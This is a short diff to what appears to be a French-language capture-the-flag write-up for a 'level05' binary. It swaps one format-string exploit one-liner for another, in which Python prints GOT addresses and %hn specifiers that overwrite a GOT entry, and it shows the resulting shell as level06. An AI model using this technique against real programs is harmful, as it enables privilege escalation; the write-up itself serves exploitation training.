@@ -80,12 +80,8 @@ Adresse GOT     = 0x080497e0  →  écriture à 0x080497e0 et 0x080497e2
 ### Exploitation
 
 ```bash
-(python -c '
-print "\xe0\x97\x04\x08"
-    + "\xe2\x97\x04\x08"
-    + "%55512c%10$hn"
-    + "%10015c%11$hn"
-'; cat) | ./level05
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56022x" + "%10$08hn" + "%9505x" + "%11$08hn"' ; cat -) | ./level05
+
 
 $ whoami
 level06
